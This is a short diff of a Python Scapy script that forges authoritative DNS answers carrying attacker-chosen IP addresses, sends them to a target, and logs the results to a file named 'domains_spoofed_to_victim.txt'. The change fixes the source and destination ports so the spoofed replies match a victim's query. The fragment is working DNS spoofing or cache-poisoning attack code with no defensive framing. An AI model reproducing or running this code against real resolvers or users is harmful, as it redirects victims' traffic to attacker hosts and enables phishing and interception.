@@ -20,7 +20,7 @@ for one_domain in domains_raw:
 	separate=one_domain.split(" ")
 	if len(separate)>1:
 		try:
-			a=IP(dst=external_ip)/ UDP(dport=53)/DNS(id=0x6696,ancount=1,aa=1,an=DNSRR(rrname=separate[0],rdata=separate[2]),qr=1L,qd=DNSQR(qname=separate[0]))
+			a=IP(dst=external_ip)/ UDP(sport=53,dport=43246)/DNS(id=0x6696,ancount=1,aa=1,an=DNSRR(rrname=separate[0],rdata=separate[2]),qr=1L,qd=DNSQR(qname=separate[0]))
 			sr1(a,timeout=1,retry=3,verbose=0)
 			with open("domains_spoofed_to_victim.txt",'a') as file:
 				file.write(separate[0]+" "+separate[1]+" "+separate[2]+"\n")
